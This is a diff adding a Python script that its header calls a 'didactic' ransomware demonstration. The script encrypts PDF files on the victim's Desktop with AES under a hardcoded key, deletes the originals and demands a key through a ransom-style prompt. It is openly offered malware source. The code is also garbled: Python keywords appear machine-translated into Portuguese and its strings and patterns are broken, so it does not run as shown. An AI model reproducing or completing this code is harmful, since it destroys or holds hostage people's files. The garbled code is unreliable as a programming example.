@@ -1,0 +1,85 @@
+"" "
+Ransomware - 0.0.0.0
+
+              Create: kyokyo's
+
+    Feito com intuito de demonstração
+          Reponha em repositório só deixe os cretidos :)
+
+ OBS: feito para total didática!!
+
+"" "
+
+importar os
+import glob
+tempo de importação
+importar pyaes
+de pathlib import Path
+
+lst_arq = ["* .pdf"]
+
+imprimir ('Criptografando')
+tempo.sono (3)
+
+# Entra no Desktop e faz a verificação
+experimentar:
+    desktop = Path.home () / "Desktop"
+# download = Path.home () / "Downloads"
+exceto exceção:
+    passar
+
+os.chdir (desktop)
+
+
+def criptografando ():
+    para arquivos em lst_arq:
+        para format_file em glob.glob (arquivos):
+            imprimir (format_file)
+            f = open (f '{desktop} \\ {format_file}', 'rb')
+            file_data = f.read ()
+            f.close ()
+
+            os.remove (f '{desktop} \\ {format_file}')
+            key = b "1ab2c3e4f5g6h7i8" # 16 bytes chave - chave
+            aes = pyaes.AESModeOfOperationCTR (chave)
+            crypto_data = aes.encrypt (file_data)
+
+            # Salvando arquivo novo (.ransomcrypter)
+
+            new_file = format_file + ".ransomcrypter"
+            new_file = open (f '{desktop} \\ {new_file}', 'wb')
+            new_file.write (crypto_data)
+            new_file.close ()
+
+
+def descrypt (decrypt_file):
+    experimentar:
+        para arquivo em glob.glob ('*. ransomcrypter'):
+
+            keybytes = decrypt_file.encode ()
+            name_file = open (file, 'rb')
+            file_data = name_file.read ()
+            dkey = keybytes # chave de 16 bytes - mudança para sua chave
+            daes = pyaes.AESModeOfOperationCTR (dkey)
+            decrypt_data = daes.decrypt (file_data)
+
+            format_file = file.split ('.')
+            new_file_name = format_file [0] + '.' + format_file [1] # Caminho para soltar o arquivo
+
+            dnew_file = open (f '{desktop} \\ {new_file_name}', 'wb')
+            dnew_file.write (decrypt_data)
+            dnew_file.close ()
+    exceto ValueError como err:
+        imprimir ('Chave inválida')
+
+
+if __name__ == '__main__':
+    criptografando ()
+    se criptografando:
+        key = input ('Seu PC foi criptografado informe a chave para liberar os arquivos:')
+        if key == '1ab2c3e4f5g6h7i8':
+            descrypt (key)
+            para del_file em glob.glob ('*. ransomcrypter'):
+                os.remove (f '{desktop} \\ {del_file}')
+        senão:
+            imprimir ('Chave de liberação inválida !!!')
